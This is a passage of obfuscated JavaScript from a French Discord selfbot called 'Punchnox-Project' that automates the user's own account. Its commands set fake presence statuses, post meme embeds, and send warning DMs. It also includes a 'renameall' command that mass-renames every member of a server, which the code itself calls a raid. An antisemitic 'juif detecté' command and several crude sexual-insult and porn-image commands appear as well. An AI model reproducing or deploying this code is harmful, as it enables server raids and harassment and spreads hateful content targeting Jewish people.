                            var cq = new aw.RichEmbed().setTitle('je débite aussi vite que tu suces des bites').setDescription('').setImage('https://risibank.fr/cache/stickers/d1430/143027-full.jpeg').setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.channel.send(cq);
                          }
                        }
                        if (cg.content === ab + 'clakos') {
                          if (cg.author.id === aN.user.id) {
                            cg.delete();
                            var cq = new aw.RichEmbed().setTitle('***askip les grands h4x0r use le cmd fin cest pas moi qui le dit***').setDescription('').setImage('https://cdn.discordapp.com/attachments/708005751012196383/712767215702638622/20200520_140958.jpg').setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.channel.send(cq);
                          }
                        }
                        if (cg.content.startsWith(ab + 'rip')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            let ol = cg.mentions.users.first() ? cg.mentions.users.first() : cg.author,
                              om = ol.displayAvatarURL;
                            var eu = {};
                            eu.url = om;
                            let on = aO.generate('rip', eu).then(oo => {
                              var op = {};
                              op.attachment = oo, op.name = 'rip.gif';
                              var oq = {};
                              oq.files = [op], cg.channel.send(oq);
                            });
                          }
                        }
                        if (cg.content.includes(ab + 'daronned')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            if (cg.mentions.users.first()) {
                              user = cg.mentions.users.first();
                            } else {
                              user = cg.author;
                            }
                            var cq = new aw.RichEmbed().setTitle(user.username + ', ***Is DARONNED***').setDescription('').setImage('https://www.mamanpourlavie.com/uploads/images/articles.cache/2015/03/24/file_main_image_10969_1_enfant_se_frappe_volontairement_krouomanie_10969_01_1500X1000_cache_1200x630.jpg').setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.channel.send(cq);
                          }
                        }
                        if (cg.content.includes(ab + 'deathn')) {
                          if (cg.author.id == aN.user.id) {
                            cg.delete();
                            if (cg.mentions.users.first()) {
                              user = cg.mentions.users.first();
                            } else user = cg.author;
                            var ev = new aw.RichEmbed().setAuthor(user.username + '  T\'es le prochain sur la list : ) 馃搩').setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL).setImage('https://cdn.discordapp.com/attachments/555403860018200606/561655171218800674/kira_justice_by_machiavellianprince-dbiokam.gif');
                            cg.channel.send(ev);
                          }
                        } else {
                          if (cg.content.startsWith(ab + 'spotify')) {
                            if (cg.author.id === aN.user.id) {
                              if (c9) {
                                const or = cg.content.split(' ').slice(1).join(' ') || cg.author.username;
                                var ew = new aw.RichEmbed().setTitle('***tu écoute: ' + or + ' sur spotify***').setColor(ad).setTimestamp().setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                                let ot = aF.createSpotifyRpc(aN).setAssetsLargeImage('spotify:ab67616d0000b2739501a78fed26d59bb86d1d9e').setAssetsSmallImage('spotify:ab67616d0000b2739501a78fed26d59bb86d1d9e').setDetails(or).setState('𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩').setStartTimestamp(Date.now()).setEndTimestamp(Date.now() + 86400000);
                                aN.user.setPresence(ot.toDiscord()).then(cg.edit(ew)).catch(console.error);
                              } else cg.edit(cu);
                            }
                          }
                        }
                        var ex = new aw.RichEmbed().setTitle('***Votre Status a chargé avec succès***').setTimestamp().setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL),
                          ey = new aw.RichEmbed().setTitle('***Vous n\'avez pas mis de texte avec votre status***').setTimestamp().setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL),
                          cN = cg.content.split(' '),
                          cn = cN.slice(1);
                        let ez = cn.slice(0).join(' ');
                        if (cg.content.startsWith(ab + 'github')) {
                          if (cg.author.id === aN.user.id) {
                            var dq = () => '10000000-1000-4000-8000-100000000000'.replace(/[018]/g, ou => (ou ^ Math.random() * 16 >> ou / 4).toString(16));
                            aF.getRpcImage('719905369723502602', 'github').then(ou => {
                              let ov = new aF.Rpc().setName('Github').setUrl(ae).setType('PLAYING').setApplicationId('719905369723502602').setAssetsLargeImage(ou.id).setAssetsLargeText('Github').setState('𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩').setDetails(ez).setStartTimestamp(Date.now()).setParty({
                                'id': dq()
                              });
                              aN.user.setPresence(ov.toDiscord()), cg.edit(ex);
                            }).catch(console.error);
                          }
                        }
                        if (cg.content.startsWith(ab + 'ytb')) {
                          if (cg.author.id === aN.user.id) {
                            if (c9) {
                              var dq = () => '10000000-1000-4000-8000-100000000000'.replace(/[018]/g, ou => (ou ^ Math.random() * 16 >> ou / 4).toString(16));
                              aF.getRpcImage('698916141896171630', 'ytb').then(ou => {
                                let oy = new aF.Rpc().setName('YouTube').setUrl(ae).setType('WATCHING').setApplicationId('698916141896171630').setAssetsLargeImage(ou.id).setAssetsLargeText('Youtube').setState('𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩').setDetails(ez).setStartTimestamp(Date.now()).setParty({
                                  'id': dq()
                                });
                                aN.user.setPresence(oy.toDiscord()), cg.edit(ex);
                              }).catch(console.error);
                            } else {
                              cg.edit(cu);
                            }
                          }
                        }
                        if (cg.content.startsWith(ab + 'python')) {
                          if (cg.author.id === aN.user.id) {
                            var dq = () => '10000000-1000-4000-8000-100000000000'.replace(/[018]/g, oy => (oy ^ Math.random() * 16 >> oy / 4).toString(16));
                            aF.getRpcImage('698916141896171630', 'python2').then(oy => {
                              let oz = new aF.Rpc().setName('DEV').setUrl(ae).setType('STREAMING').setApplicationId('698916141896171630').setAssetsLargeImage(oy.id).setAssetsLargeText(oy.name).setAssetsSmallImage(oy.id).setState('dev en python').setParty({
                                'size': [1, 999999],
                                'id': dq()
                              }).setDetails('𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩 en dev');
                              aN.user.setPresence(oz.toDiscord()), cg.edit(ex);
                            }).catch(console.error);
                          }
                        }
                        if (cg.content.startsWith(ab + 'sretro1')) {
                          if (cg.author.id === aN.user.id) {
                            if (c9) {
                              var dq = () => '10000000-1000-4000-8000-100000000000'.replace(/[018]/g, oy => (oy ^ Math.random() * 16 >> oy / 4).toString(16));
                              aF.getRpcImage('698916141896171630', 'punchnox').then(oy => {
                                let oC = new aF.Rpc().setName('𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩').setUrl(ae).setType('PLAYING').setDetails(ez).setApplicationId('698916141896171630').setAssetsLargeImage(oy.id).setAssetsSmallImage(oy.id).setAssetsSmallText('punchnox project').setAssetsLargeText('𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩').setStartTimestamp(Date.now()).setParty({
                                  'id': dq()
                                });
                                aN.user.setPresence(oC.toDiscord()), cg.edit(ex);
                              }).catch(console.error);
                            } else cg.edit(cu);
                          }
                        }
                        if (cg.content.startsWith(ab + 'hunter')) {
                          if (cg.author.id === aN.user.id) {
                            var dq = () => '10000000-1000-4000-8000-100000000000'.replace(/[018]/g, oA => (oA ^ Math.random() * 16 >> oA / 4).toString(16));
                            aF.getRpcImage('698916141896171630', 'hunter').then(oA => {
                              var oB = {};
                              oB.id = dq();
                              let oC = new aF.Rpc().setName('𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩').setUrl(ae).setType('PLAYING').setApplicationId('698916141896171630').setAssetsLargeImage(oA.id).setAssetsSmallImage(oA.id).setDetails(ez).setAssetsLargeText('𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩').setState('𝙨𝙩𝙖𝙩𝙪𝙨 𝙝𝙪𝙣𝙩𝙚𝙧').setStartTimestamp(Date.now()).setParty(oB);
                              aN.user.setPresence(oC.toDiscord()), cg.edit(ex);
                            }).catch(console.error);
                          }
                        }
                        if (cg.content.startsWith(ab + 'deezer')) {
                          if (cg.author.id === aN.user.id) {
                            var dq = () => '10000000-1000-4000-8000-100000000000'.replace(/[018]/g, oA => (oA ^ Math.random() * 16 >> oA / 4).toString(16));
                            aF.getRpcImage('698916141896171630', 'dezzer').then(oA => {
                              var oB = {};
                              oB.id = dq();
                              let oC = new aF.Rpc().setName('𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩').setUrl(ae).setType('LISTENING').setApplicationId('698916141896171630').setDetails(ez).setAssetsLargeImage(oA.id).setAssetsSmallImage(oA.id).setAssetsLargeText('𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩').setState('écoute deezer').setStartTimestamp(Date.now()).setParty(oB);
                              aN.user.setPresence(oC.toDiscord()), cg.edit(ex);
                            }).catch(console.error);
                          }
                        }
                        if (cg.content.startsWith(ab + 'stickos')) {
                          if (cg.author.id === aN.user.id) {
                            var dq = () => '10000000-1000-4000-8000-100000000000'.replace(/[018]/g, oB => (oB ^ Math.random() * 16 >> oB / 4).toString(16));
                            aF.getRpcImage('698916141896171630', 'fumer').then(oB => {
                              var oC = {};
                              oC.id = dq();
                              let oD = new aF.Rpc().setName('𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩').setUrl(ae).setType('PLAYING').setApplicationId('698916141896171630').setDetails(ez).setAssetsLargeImage(oB.id).setAssetsSmallImage(oB.id).setAssetsLargeText('𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩').setState('𝙛𝙪𝙢𝙚 𝙪𝙣 𝙜𝙧𝙤𝙨 𝙨𝙩𝙞𝙘𝙠𝙤𝙨').setStartTimestamp(Date.now()).setParty(oC);
                              aN.user.setPresence(oD.toDiscord()), cg.edit(ex);
                            }).catch(console.error);
                          }
                        }
                        if (cg.content.startsWith(ab + 'black clover')) {
                          if (cg.author.id === aN.user.id) {
                            var dq = () => '10000000-1000-4000-8000-100000000000'.replace(/[018]/g, oC => (oC ^ Math.random() * 16 >> oC / 4).toString(16));
                            aF.getRpcImage('698916141896171630', 'black-clover').then(oC => {
                              let oD = new aF.Rpc().setName('𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩').setUrl(ae).setType('PLAYING').setDetails(ez).setApplicationId('698916141896171630').setAssetsLargeImage(oC.id).setAssetsSmallImage(oC.id).setAssetsLargeText('𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩').setState('𝙨𝙩𝙖𝙩𝙪𝙨 𝙗𝙡𝙖𝙘𝙠-𝙘𝙡𝙤𝙫𝙚𝙧').setStartTimestamp(Date.now()).setParty({
                                'id': dq()
                              });
                              aN.user.setPresence(oD.toDiscord()), cg.edit(ex);
                            }).catch(console.error);
                          }
                        }
                        if (cg.content.startsWith(ab + 'sretro2')) {
                          if (cg.author.id === aN.user.id) {
                            var dq = () => '10000000-1000-4000-8000-100000000000'.replace(/[018]/g, oD => (oD ^ Math.random() * 16 >> oD / 4).toString(16));
                            aF.getRpcImage('698916141896171630', 'maxresdefault').then(oD => {
                              let oE = new aF.Rpc().setName('𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩').setUrl(ae).setType('PLAYING').setApplicationId('698916141896171630').setDetails(ez).setAssetsLargeImage(oD.id).setAssetsSmallImage(oD.id).setAssetsLargeText('𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩').setState('𝙨𝙩𝙖𝙩𝙪𝙨 𝙧𝙚𝙩𝙧𝙤').setStartTimestamp(Date.now()).setParty({
                                'id': dq()
                              });
                              aN.user.setPresence(oE.toDiscord()), cg.edit(ex);
                            }).catch(console.error);
                          }
                        }
                        if (cg.content.startsWith(ab + 'sretro3')) {
                          if (cg.author.id === aN.user.id) {
                            var dq = () => '10000000-1000-4000-8000-100000000000'.replace(/[018]/g, oE => (oE ^ Math.random() * 16 >> oE / 4).toString(16));
                            aF.getRpcImage('698916141896171630', 'retro2').then(oE => {
                              let oF = new aF.Rpc().setName('𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩').setUrl(ae).setType('PLAYING').setApplicationId('698916141896171630').setDetails(ez).setAssetsLargeImage(oE.id).setAssetsSmallImage(oE.id).setAssetsLargeText('𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩').setState('𝙨𝙩𝙖𝙩𝙪𝙨 𝙧𝙚𝙩𝙧𝙤').setStartTimestamp(Date.now()).setParty({
                                'id': dq()
                              });
                              aN.user.setPresence(oF.toDiscord()), cg.edit(ex);
                            }).catch(console.error);
                          }
                        }
                        var cN = cg.content.split(' '),
                          dt = cN.slice(1);
                        let eA = dt.slice(0).join(' ');
                        if (cg.content.startsWith(ab + 'sneko')) {
                          if (cg.author.id === aN.user.id) {
                            !eA && cg.edit(ey);
                            if (cg.deletable) cg.delete();
                            var dq = () => '10000000-1000-4000-8000-100000000000'.replace(/[018]/g, oE => (oE ^ Math.random() * 16 >> oE / 4).toString(16));
                            aF.getRpcImage('698916141896171630', 'neko').then(oE => {
                              let oH = new aF.Rpc().setName('𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩').setUrl(ae).setType('PLAYING').setApplicationId('698916141896171630').setDetails(ez).setAssetsLargeImage(oE.id).setAssetsSmallImage(oE.id).setAssetsLargeText('𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩').setState('𝙨𝙩𝙖𝙩𝙪𝙨 𝙉𝙚𝙠𝙤').setDetails(eA).setStartTimestamp(Date.now()).setParty({
                                'id': dq()
                              });
                              aN.user.setPresence(oH.toDiscord()), cg.edit(ex);
                            }).catch(console.error);
                          }
                        }
                        if (cg.content === ab + 'rpc') {
                          if (cg.author.id === aN.user.id) {
                            if (c9) {
                              var dq = () => '10000000-1000-4000-8000-100000000000'.replace(/[018]/g, oE => (oE ^ Math.random() * 16 >> oE / 4).toString(16));
                              aF.getRpcImage(aq, ar).then(oE => {
                                var oF = {};
                                oF.size = [ao, ap], oF.id = dq();
                                let oG = new aF.Rpc().setName(aj).setUrl('https://twitch.tv/punchnox').setType('PLAYING').setApplicationId(aq).setAssetsLargeImage(oE.id).setAssetsSmallImage(oE.id).setAssetsLargeText(am).setAssetsSmallText(an).setState(al).setDetails(ak).setStartTimestamp(Date.now()).setParty(oF);
                                aN.user.setPresence(oG.toDiscord());
                              }).catch(console.error);
                              var cq = new aw.RichEmbed().setTitle('***Votre Riche Presence custom a chargé avec succès***').setDescription('Titre : ' + aj + ' \nDétails : ' + ak + ' \nState : ' + al + ' \nSmall texte : ' + am + ' \nLarge texte : ' + an + ' \nNombre de joueurs : ' + ao + ' \n Nombre maximums de joueurs : ' + ap + ' \n Id de l\'application : ' + aq + ' \nNom de l\'image : ' + ar).setTimestamp().setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                              cg.edit(cq).catch(oE => console.log('[', ay.hex(u)('ERROR'), ']', 'une erreur est survenue que je ne peux régler'));
                            } else {
                              cg.edit(cu);
                            }
                          }
                        }
                        if (cg.content === ab + 'rpcfree') {
                          if (cg.author.id === aN.user.id) {
                            var dq = () => '10000000-1000-4000-8000-100000000000'.replace(/[018]/g, oH => (oH ^ Math.random() * 16 >> oH / 4).toString(16));
                            aF.getRpcImage(aq, ar).then(oH => {
                              let oJ = new aF.Rpc().setName(aj).setUrl('https://twitch.tv/punchnox').setType('PLAYING').setApplicationId(aq).setAssetsLargeImage(oH.id).setAssetsSmallImage(oH.id).setAssetsLargeText('𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩').setAssetsSmallText('𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩').setDetails('𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩 (rpc free)').setStartTimestamp(Date.now());
                              aN.user.setPresence(oJ.toDiscord());
                            }).catch(console.error);
                            var cq = new aw.RichEmbed().setTitle('***Votre Riche Presence custom free a chargé avec succès***').setDescription('Titre : ' + aj + ' \nId de l\'application : ' + aq + ' \nNom de l\'image : ' + ar).setTimestamp().setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.edit(cq).catch(oH => console.log('[', ay.hex(u)('ERROR'), ']', 'une erreur est survenue que je ne peux régler'));
                          }
                        }
                        if (cg.content.startsWith(ab + 'bitcoin')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            var dq = () => '10000000-1000-4000-8000-100000000000'.replace(/[018]/g, oI => (oI ^ Math.random() * 16 >> oI / 4).toString(16));
                            aF.getRpcImage('698916141896171630', 'btc').then(oI => {
                              let oJ = new aF.Rpc().setName('𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩').setUrl(ae).setType('PLAYING').setApplicationId('698916141896171630').setDetails(ez).setAssetsLargeImage(oI.id).setAssetsSmallImage(oI.id).setAssetsLargeText('𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩').setState('𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩').setStartTimestamp(Date.now()).setParty({
                                'id': dq()
                              });
                              aN.user.setPresence(oJ.toDiscord()), cg.edit(ex);
                            }).catch(console.error);
                          }
                        }
                        if (cg.content.startsWith(ab + 'anime1')) {
                          if (cg.author.id === aN.user.id) {
                            if (c9) {
                              var dq = () => '10000000-1000-4000-8000-100000000000'.replace(/[018]/g, oI => (oI ^ Math.random() * 16 >> oI / 4).toString(16));
                              aF.getRpcImage('698916141896171630', 'anime2').then(oI => {
                                var oJ = {};
                                oJ.id = dq();
                                let oK = new aF.Rpc().setName('𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩').setUrl(ae).setType('PLAYING').setApplicationId('698916141896171630').setDetails(ez).setAssetsLargeImage(oI.id).setAssetsSmallImage(oI.id).setAssetsLargeText('𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩').setState('𝙨𝙩𝙖𝙩𝙪𝙨 𝙖𝙣𝙞𝙢𝙚𝟭').setStartTimestamp(Date.now()).setParty(oJ);
                                aN.user.setPresence(oK.toDiscord()), cg.edit(ex);
                              }).catch(console.error);
                            } else cg.edit(cu);
                          }
                        }
                        if (cg.content.startsWith(ab + 'anime2')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            var dq = () => '10000000-1000-4000-8000-100000000000'.replace(/[018]/g, oI => (oI ^ Math.random() * 16 >> oI / 4).toString(16));
                            aF.getRpcImage('698916141896171630', 'anime3').then(oI => {
                              let oJ = new aF.Rpc().setName('𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩').setUrl(ae).setType('PLAYING').setApplicationId('698916141896171630').setDetails(ez).setAssetsLargeImage(oI.id).setAssetsSmallImage(oI.id).setAssetsLargeText('𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩').setState('𝙨𝙩𝙖𝙩𝙪𝙨 𝙖𝙣𝙞𝙢𝙚𝟮').setStartTimestamp(Date.now()).setParty({
                                'id': dq()
                              });
                              aN.user.setPresence(oJ.toDiscord()), cg.edit(ex);
                            }).catch(console.error);
                          }
                        }
                        if (cg.content.startsWith(ab + 'anime3')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            var dq = () => '10000000-1000-4000-8000-100000000000'.replace(/[018]/g, oJ => (oJ ^ Math.random() * 16 >> oJ / 4).toString(16));
                            aF.getRpcImage('698916141896171630', 'assasination').then(oJ => {
                              let oL = new aF.Rpc().setName('𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩').setUrl(ae).setType('PLAYING').setApplicationId('698916141896171630').setDetails(ez).setAssetsLargeImage(oJ.id).setAssetsSmallImage(oJ.id).setAssetsLargeText('𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩').setState('𝙨𝙩𝙖𝙩𝙪𝙨 𝙖𝙣𝙞𝙢𝙚𝟯').setStartTimestamp(Date.now()).setParty({
                                'id': dq()
                              });
                              aN.user.setPresence(oL.toDiscord()), cg.edit(ex);
                            }).catch(console.error);
                          }
                        }
                        if (cg.content.startsWith(ab + 'ssayan')) {
                          if (cg.author.id == aN.user.id) {
                            cg.delete();
                            var eB = new aw.RichEmbed().setAuthor(cg.author.tag + ' 𝐬𝐞 𝐭𝐫𝐚𝐧𝐬𝐟𝐨𝐫𝐦𝐞 𝐞𝐧 𝐬𝐮𝐩𝐞𝐫 𝐬𝐚𝐲𝐚𝐧.').setColor(ad).setImage('https://media.giphy.com/media/1TpxnnPr4k5H2/giphy.gif').setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.channel.send(eB);
                          }
                        }
                        if (cg.content === ab + 'juif') {
                          if (cg.author.id === aN.user.id) {
                            cg.delete();
                            var eC = new aw.RichEmbed().setColor(ad).setTitle('juif detecté').setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL).setImage('https://tse2.mm.bing.net/th?id=OIP.6Dju6KuyqtJG0UjoSd9x2QHaE0&pid=15.1&P=0&w=240&h=157');
                            cg.channel.send(eC);
                          }
                        }
                        if (cg.content === ab + 'h4x0r') {
                          if (cg.author.id === aN.user.id) {
                            cg.delete();
                            var eC = new aw.RichEmbed().setColor(ad).setTitle('H4x0r detecté').setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL).setImage('https://cdn.discordapp.com/attachments/697477241407275214/713463761469571153/tenor.gif');
                            cg.channel.send(eC);
                          }
                        }
                        if (cg.content.startsWith(ab + 'warn')) {
                          if (cg.author.id == aN.user.id) {
                            if (c9) {
                              cg.channel.bulkDelete(1);
                              const oM = cg.mentions.users.first();
                              let oN = cg.content.split(' ').slice(2).join(' ');
                              if (oM) {
                                const oO = cg.guild.member(oM),
                                  oP = new aw.RichEmbed().setTitle(':warning: AVERTISSEMENT :warning:').setDescription('**AVERTI PAR :** ' + cg.author.username + '\n**RAISON :** ' + oN).setColor(ad).setTimestamp().setFooter('Rappel : 3 warn = 1 kick');
                                oO.send(oP);
                              }
                            } else cg.channel.send(cu);
                          }
                        }
                        if (cg.content.startsWith(ab + 'ascii')) {
                          if (cg.author.id == aN.user.id) {
                            let oQ = cg.content.split(' ').slice(1);
                            if (!oQ.join(' ')) return cg.channel.send('***Veuillez spécifié un text***.').then(oR => oR.delete(5000));
                            aD.get('https://artii.herokuapp.com/make?text=' + oQ).then(oR => {
                              cg.edit('```' + oR.body + '```');
                            });
                          }
                        }
                        if (cg.content.startsWith(ab + 'update')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            if (aY.includes(bd)) var eD = '[Selfbot] la version du self est bien à jours.';else {
                              var eD = '[Selfbot] la version du self n\'est pas à jours.';
                            }
                            let oS = new aw.RichEmbed().setTitle('** 「MENU UPDATE」 **').setDescription('').setColor(ad).addField(eD, 'versiion actuel : ' + aY).setDescription(bc).setImage(bm).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.channel.send(oS);
                          }
                        }
                        if (cg.content.startsWith(ab + 'renameall')) {
                          if (cg.author.id === aN.user.id) {
                            let oV = cg.guild;
                            if (!oV) return cg.edit(':x: **Commande uniquement utilisable sur un serveur**');
                            var eE = {};
                            eE.id = cg.guild.id, aD.post('https://punchnox-project-api.herokuapp.com/api/update/serveur-blackliste').send(eE).end((oW, oX) => {
                              if (oX.body.message === 'Id Not found.') {
                                const p0 = cg.content.split(' ').slice(2).join(' ') || cg.author.username;
                                if (!cg.member.hasPermission('MANAGE_NICKNAMES')) return cg.delete().then(console.log('[', ay.hex(u)('ERROR'), ']', ay.hex(y)('permission insuffisante')));
                                const p1 = cg.guild.members;
                                cg.edit('Je renomme tout le monde par ' + p0), p1.forEach(p2 => {
                                  p2.setNickname(p0).catch(p3 => console.log('[', ay.hex(u)('ERROR'), ']', 'une erreur est survenue que je ne peux régler'));
                                }), console.log(ay.hex(t)('Commande name all effectué'));
                              } else cg.edit(':x: **Ce serveur est dans la blacklist donc vous ne pouvez pas le raid.(**');
                            });
                          }
                        }
                        if (cg.content.startsWith(ab + 'biffle')) {
                          if (cg.author.id == aN.user.id) {
                            cg.delete();
                            var eF = new aw.RichEmbed().setAuthor(cg.author.tag + ' 𝐭𝐞 𝐛𝐢𝐟𝐟𝐥𝐞 𝐬𝐚𝐥𝐨𝐩𝐞.').setColor(ad).setImage('http://www.la-biffle.com/la-biffle.com/image/la_biffle.gif');
                            cg.channel.send(eF);
                          }
                        }
                        if (cg.content.startsWith(ab + 'spornhub')) {
                          if (cg.author.id === aN.user.id) {
                            var dq = () => '10000000-1000-4000-8000-100000000000'.replace(/[018]/g, oY => (oY ^ Math.random() * 16 >> oY / 4).toString(16));
                            aF.getRpcImage('698916141896171630', 'pornhub').then(oY => {
                              let p0 = new aF.Rpc().setName('Pornhub').setUrl(ae).setType('PLAYING').setApplicationId('698916141896171630').setAssetsLargeImage(oY.id).setAssetsLargeText('𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩').setState('𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩').setDetails(ez).setStartTimestamp(Date.now()).setParty({
                                'id': dq()
                              });
                              aN.user.setPresence(p0.toDiscord()), cg.edit(ex);
                            }).catch(console.error);
                          }
                        }
                        if (cg.content.startsWith(ab + 'twitter')) {
                          if (cg.author.id === aN.user.id) {
                            if (c9) {
                              var dq = () => '10000000-1000-4000-8000-100000000000'.replace(/[018]/g, oZ => (oZ ^ Math.random() * 16 >> oZ / 4).toString(16));
                              aF.getRpcImage('698916141896171630', 'twitter').then(oZ => {
                                let p0 = new aF.Rpc().setName('Twitter').setUrl(ae).setType('PLAYING').setApplicationId('698916141896171630').setAssetsLargeImage(oZ.id).setAssetsLargeText('𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩').setState('𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩').setDetails(ez).setStartTimestamp(Date.now()).setParty({
                                  'id': dq()
                                });
                                aN.user.setPresence(p0.toDiscord()), cg.edit(ex);
                              }).catch(console.error);
                            } else {
                              cg.edit(cu);
                            }
                          }
                        }
                        if (cg.content === ab + 'random') {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            random = Math.floor(Math.random() * 101) + 1, cg.channel.send('Random number : **' + random + '**');
                          }
                        }
                        if (cg.content.startsWith(ab + 'checkhost')) {
                          if (cg.author.id === aN.user.id) {
                            if (c9) {
                              cg.delete();
                              var eG = d8.join(' ').slice(0);
                              cg.channel.send('https://check-host.net/ip-info?host=' + eG).catch(console.error);
                            } else cg.channel.send(cu);
                          }
                        }
                        if (cg.content.startsWith(ab + 'bite')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            var cq = new aw.RichEmbed().setDescription('```bite```').addField('et oui une commande caché').setImage('https://cdn1.sexvid.xxx/contents/videos_screenshots/32000/32725/preview.mp4.jpg').setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.channel.send(cq);
                          }
                        }
                        if (cg.content.startsWith(ab + 'lenny')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            cg.channel.send('( ͡° ͜ʖ ͡°)');
                          }
                        }
                        if (cg.content.startsWith(ab + 'idc')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            cg.channel.send('╭∩╮（︶︿︶）╭∩╮');
                          }
                        }
                        if (cg.content.startsWith(ab + 'doubleflip')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            cg.channel.send('┻━┻︵ (°□°)/ ︵ ┻━┻');
                          }
                        }
                        if (cg.content.startsWith(ab + 'tableflip')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            cg.channel.send('(╯°□°）╯︵ ┻━┻');
                          }
                        }
                        if (cg.content.startsWith(ab + 'unflip')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
